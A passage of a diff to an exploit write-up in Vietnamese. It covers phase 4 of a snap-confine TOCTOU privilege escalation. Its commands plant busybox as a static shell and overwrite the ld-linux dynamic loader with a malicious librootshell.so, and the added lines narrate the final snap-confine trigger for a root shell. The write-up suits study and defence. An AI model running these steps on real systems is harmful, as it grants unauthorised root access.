@@ -78,11 +78,11 @@ Lúc này, chương tình xác nhận điểm trigger TOCTOU. Ta sẽ tiến hà
 Phase 4: Trigger Root Shell
 
 Treo Terminal 2, mở Terminal thứ 3, nhờ việc ghi ra file mà ta có được PID của cái sandbox đã tạo phía trên (sandbox 2).
-
-Xác nhận ta là chủ sở hữu của thư viện
+Xác nhận chúng ta là chủ sở hữu của thư viện:
 
 ![](Attachments/Pasted%20image%2020260505200920.png)
 
+Ta tiến hành tráo đổi thư viện này với thư viện độc hại đã chuẩn bị:
 Plant busybox as /tmp/sh-static binary, no dependency on ld-linux
 `cp /usr/bin/busybox ./tmp/sh`
 Overwrite ld-linux with our shellcode
@@ -91,6 +91,7 @@ Ghi đè thư viện: Any dynamically-linked SUID binary executed in this namesp
 cat ~/librootshell.so > ./usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
 ```
 
+Trigger lệnh snap-confine trong sandbox (sandbox 3), 
 ![](Attachments/Pasted%20image%2020260505201020.png)
 
 Phase 5:
